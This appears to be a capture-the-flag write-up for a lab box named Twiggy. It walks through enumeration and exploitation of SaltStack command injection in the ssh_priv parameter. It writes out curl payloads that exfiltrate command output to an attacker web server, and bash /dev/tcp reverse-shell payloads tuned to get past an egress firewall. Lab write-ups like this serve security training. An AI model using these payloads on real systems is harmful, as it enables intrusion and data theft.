# Twiggy
### Enumeration
```
# Nmap 7.92 scan initiated Sun Mar 27 07:58:52 2022 as: nmap -v -p- -sC -sV -oN tcp.out 192.168.61.62
Nmap scan report for 192.168.61.62
Host is up (0.00038s latency).
Not shown: 65529 filtered tcp ports (no-response)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.4 (protocol 2.0)
| ssh-hostkey: 
|   2048 44:7d:1a:56:9b:68:ae:f5:3b:f6:38:17:73:16:5d:75 (RSA)
|   256 1c:78:9d:83:81:52:f4:b0:1d:8e:32:03:cb:a6:18:93 (ECDSA)
|_  256 08:c9:12:d9:7b:98:98:c8:b3:99:7a:19:82:2e:a3:ea (ED25519)
53/tcp   open  domain  NLnet Labs NSD
80/tcp   open  http    nginx 1.16.1
|_http-favicon: Unknown favicon MD5: 11FB4799192313DD5474A343D9CC0A17
|_http-title: Home | Mezzanine
| http-methods: 
|_  Supported Methods: GET HEAD OPTIONS
|_http-server-header: nginx/1.16.1
4505/tcp open  zmtp    ZeroMQ ZMTP 2.0
4506/tcp open  zmtp    ZeroMQ ZMTP 2.0
8000/tcp open  http    nginx 1.16.1
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Site doesn't have a title (application/json).
|_http-open-proxy: Proxy might be redirecting requests
|_http-server-header: nginx/1.16.1
MAC Address: 00:50:56:BF:F2:E8 (VMware)
```

Port 80 is running some sort of CMS called Mezzanine. I couldn't find any vulnerabilities, but noted that it is powered by Django, so is Python-based. Checking out port 8000, we find an API. The index route returns:

```json
{"clients": ["local", "local_async", "local_batch", "local_subset", "runner", "runner_async", "ssh", "wheel", "wheel_async"], "return": "Welcome"}
```

If we visit a random path, we get a 404 and we see `Powered by CherryPy 5.6.0`.

### Foothold

I googled `cherrypy api local local_async local_batch local_subset` and found an article about _[SaltStack command injection vulnerabilities](https://www.zerodayinitiative.com/blog/2020/11/24/detailing-saltstack-salt-command-injection-vulnerabilities)_. TLDR: we have injection in the `ssh_priv` parameter. The injection is blind, so I ran a python webserver on port 80 and then I was able to exfiltrate command output using payloads like the below:

```shell
curl -v 192.168.57.62:8000/run -H 'Content-Type: application/json' -d '{"client":"ssh","tgt":"A","fun":"B","eauth":"C","ssh_priv":"; curl 192.168.57.200/$(which bash) #"}'
```

Since we have bash, let's try to get a reverse shell:

```shell
curl -v -H 'Content-Type: application/json' 192.168.52.62:8000/run -d '{"client":"ssh","tgt":"A","fun":"B","eauth":"C","ssh_priv":"| bash -i >& /dev/tcp/192.168.52.200/9001 0>&1 #"}'
```

This request timed out. I prioritised grabbing the flag by using the exfiltration trick with `$(cat /root/proof.txt)` as the path. I tried using curl to request a script which would be piped to bash or sh or python, but everything continued to timeout. This gave me a hint that maybe there was a firewall preventing certain ports from being opened. I sent the following request:

```shell
curl -v -H 'Content-Type: application/json' 192.168.52.62:8000/run -d '{"client":"ssh","tgt":"A","fun":"B","eauth":"C","ssh_priv":"| curl 192.168.52.200/$(iptables -S | base64 -w 0) #"}'
```

And I saw the request to the webserver:

```
"GET /LVAgSU5QVVQgQUNDRVBUCi1QIEZPUldBUkQgQUNDRVBUCi1QIE9VVFBVVCBBQ0NFUFQKLUEgSU5QVVQgLWkgbG8gLWogQUNDRVBUCi1BIElOUFVUIC1tIGNvbm50cmFjayAtLWN0c3RhdGUgTkVXLFJFTEFURUQsRVNUQUJMSVNIRUQgLWogQUNDRVBUCi1BIElOUFVUIC1wIHRjcCAtbSB0Y3AgLS1kcG9ydCAyMiAtaiBBQ0NFUFQKLUEgSU5QVVQgLXAgdGNwIC1tIHRjcCAtLWRwb3J0IDUzIC1qIEFDQ0VQVAotQSBJTlBVVCAtcCB0Y3AgLW0gdGNwIC0tZHBvcnQgODAgLWogQUNDRVBUCi1BIElOUFVUIC1wIHRjcCAtbSB0Y3AgLS1kcG9ydCA0NTA1IC1qIEFDQ0VQVAotQSBJTlBVVCAtcCB0Y3AgLW0gdGNwIC0tZHBvcnQgNDUwNiAtaiBBQ0NFUFQKLUEgSU5QVVQgLXAgdGNwIC1tIHRjcCAtLWRwb3J0IDgwMDAgLWogQUNDRVBUCi1BIElOUFVUIC1wIHVkcCAtbSB1ZHAgLS1kcG9ydCA1MyAtaiBBQ0NFUFQKLUEgSU5QVVQgLXAgaWNtcCAtbSBpY21wIC0taWNtcC10eXBlIDggLWogQUNDRVBUCi1BIElOUFVUIC1wIGljbXAgLW0gaWNtcCAtLWljbXAtdHlwZSAwIC1qIEFDQ0VQVAotQSBJTlBVVCAtaiBEUk9QCi1BIE9VVFBVVCAtbyBsbyAtaiBBQ0NFUFQKLUEgT1VUUFVUIC1wIHRjcCAtbSB0Y3AgLS1kcG9ydCAyMiAtbSBzdGF0ZSAtLXN0YXRlIE5FVyxFU1RBQkxJU0hFRCAtaiBBQ0NFUFQKLUEgT1VUUFVUIC1wIHRjcCAtbSB0Y3AgLS1zcG9ydCAyMiAtbSBzdGF0ZSAtLXN0YXRlIE5FVyxFU1RBQkxJU0hFRCAtaiBBQ0NFUFQKLUEgT1VUUFVUIC1wIHRjcCAtbSB0Y3AgLS1kcG9ydCA1MyAtbSBzdGF0ZSAtLXN0YXRlIE5FVyxFU1RBQkxJU0hFRCAtaiBBQ0NFUFQKLUEgT1VUUFVUIC1wIHRjcCAtbSB0Y3AgLS1zcG9ydCA1MyAtbSBzdGF0ZSAtLXN0YXRlIE5FVyxFU1RBQkxJU0hFRCAtaiBBQ0NFUFQKLUEgT1VUUFVUIC1wIHRjcCAtbSB0Y3AgLS1kcG9ydCA4MCAtbSBzdGF0ZSAtLXN0YXRlIE5FVyxFU1RBQkxJU0hFRCAtaiBBQ0NFUFQKLUEgT1VUUFVUIC1wIHRjcCAtbSB0Y3AgLS1zcG9ydCA4MCAtbSBzdGF0ZSAtLXN0YXRlIE5FVyxFU1RBQkxJU0hFRCAtaiBBQ0NFUFQKLUEgT1VUUFVUIC1wIHRjcCAtbSB0Y3AgLS1kcG9ydCA0NTA1IC1tIHN0YXRlIC0tc3RhdGUgTkVXLEVTVEFCTElTSEVEIC1qIEFDQ0VQVAotQSBPVVRQVVQgLXAgdGNwIC1tIHRjcCAtLXNwb3J0IDQ1MDUgLW0gc3RhdGUgLS1zdGF0ZSBORVcsRVNUQUJMSVNIRUQgLWogQUNDRVBUCi1BIE9VVFBVVCAtcCB0Y3AgLW0gdGNwIC0tZHBvcnQgNDUwNiAtbSBzdGF0ZSAtLXN0YXRlIE5FVyxFU1RBQkxJU0hFRCAtaiBBQ0NFUFQKLUEgT1VUUFVUIC1wIHRjcCAtbSB0Y3AgLS1zcG9ydCA0NTA2IC1tIHN0YXRlIC0tc3RhdGUgTkVXLEVTVEFCTElTSEVEIC1qIEFDQ0VQVAotQSBPVVRQVVQgLXAgdGNwIC1tIHRjcCAtLWRwb3J0IDgwMDAgLW0gc3RhdGUgLS1zdGF0ZSBORVcsRVNUQUJMSVNIRUQgLWogQUNDRVBUCi1BIE9VVFBVVCAtcCB0Y3AgLW0gdGNwIC0tc3BvcnQgODAwMCAtbSBzdGF0ZSAtLXN0YXRlIE5FVyxFU1RBQkxJU0hFRCAtaiBBQ0NFUFQKLUEgT1VUUFVUIC1wIHVkcCAtbSB1ZHAgLS1kcG9ydCA1MyAtbSBzdGF0ZSAtLXN0YXRlIE5FVyxFU1RBQkxJU0hFRCAtaiBBQ0NFUFQKLUEgT1VUUFVUIC1wIGljbXAgLW0gaWNtcCAtLWljbXAtdHlwZSA4IC1qIEFDQ0VQVAotQSBPVVRQVVQgLXAgaWNtcCAtbSBpY21wIC0taWNtcC10eXBlIDAgLWogQUNDRVBUCi1BIE9VVFBVVCAtaiBEUk9QCg== HTTP/1.1" 404 -
```

We can base64 decode to get:

```shell
-P INPUT ACCEPT
-P FORWARD ACCEPT
-P OUTPUT ACCEPT
-A INPUT -i lo -j ACCEPT
-A INPUT -m conntrack --ctstate NEW,RELATED,ESTABLISHED -j ACCEPT
-A INPUT -p tcp -m tcp --dport 22 -j ACCEPT
-A INPUT -p tcp -m tcp --dport 53 -j ACCEPT
-A INPUT -p tcp -m tcp --dport 80 -j ACCEPT
-A INPUT -p tcp -m tcp --dport 4505 -j ACCEPT
-A INPUT -p tcp -m tcp --dport 4506 -j ACCEPT
-A INPUT -p tcp -m tcp --dport 8000 -j ACCEPT
-A INPUT -p udp -m udp --dport 53 -j ACCEPT
-A INPUT -p icmp -m icmp --icmp-type 8 -j ACCEPT
-A INPUT -p icmp -m icmp --icmp-type 0 -j ACCEPT
-A INPUT -j DROP
-A OUTPUT -o lo -j ACCEPT
-A OUTPUT -p tcp -m tcp --dport 22 -m state --state NEW,ESTABLISHED -j ACCEPT
-A OUTPUT -p tcp -m tcp --sport 22 -m state --state NEW,ESTABLISHED -j ACCEPT
-A OUTPUT -p tcp -m tcp --dport 53 -m state --state NEW,ESTABLISHED -j ACCEPT
-A OUTPUT -p tcp -m tcp --sport 53 -m state --state NEW,ESTABLISHED -j ACCEPT
-A OUTPUT -p tcp -m tcp --dport 80 -m state --state NEW,ESTABLISHED -j ACCEPT
-A OUTPUT -p tcp -m tcp --sport 80 -m state --state NEW,ESTABLISHED -j ACCEPT
-A OUTPUT -p tcp -m tcp --dport 4505 -m state --state NEW,ESTABLISHED -j ACCEPT
-A OUTPUT -p tcp -m tcp --sport 4505 -m state --state NEW,ESTABLISHED -j ACCEPT
-A OUTPUT -p tcp -m tcp --dport 4506 -m state --state NEW,ESTABLISHED -j ACCEPT
-A OUTPUT -p tcp -m tcp --sport 4506 -m state --state NEW,ESTABLISHED -j ACCEPT
-A OUTPUT -p tcp -m tcp --dport 8000 -m state --state NEW,ESTABLISHED -j ACCEPT
-A OUTPUT -p tcp -m tcp --sport 8000 -m state --state NEW,ESTABLISHED -j ACCEPT
-A OUTPUT -p udp -m udp --dport 53 -m state --state NEW,ESTABLISHED -j ACCEPT
-A OUTPUT -p icmp -m icmp --icmp-type 8 -j ACCEPT
-A OUTPUT -p icmp -m icmp --icmp-type 0 -j ACCEPT
-A OUTPUT -j DROP
```

So we can see that we can only send traffic with destination port numbers like the ones we saw in the nmap scan. So we instead run:

```shell
curl -v -H 'Content-Type: application/json' 192.168.52.62:8000/run -d '{"client":"ssh","tgt":"A","fun":"B","eauth":"C","ssh_priv":"| bash -i >& /dev/tcp/192.168.52.200/8000 0>&1 #"}'
```

And we get a reverse shell!